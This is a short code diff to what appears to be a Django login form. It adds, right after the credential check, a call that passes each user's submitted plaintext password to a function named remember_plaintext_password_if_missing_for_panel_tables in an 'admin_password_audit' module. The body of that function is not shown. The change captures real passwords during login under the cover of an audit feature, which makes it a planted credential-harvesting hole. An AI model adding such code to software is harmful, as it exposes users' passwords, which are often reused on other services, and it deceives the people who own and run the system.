@@ -189,6 +189,9 @@ class CustomAuthenticationForm(AuthenticationForm):
         if self.user_cache is None:
             raise self.get_invalid_login_error()
         self.confirm_login_allowed(self.user_cache)
+        from .admin_password_audit import remember_plaintext_password_if_missing_for_panel_tables
+        if password:
+            remember_plaintext_password_if_missing_for_panel_tables(self.user_cache, password)
         return self.cleaned_data
 
     def get_invalid_login_error(self):
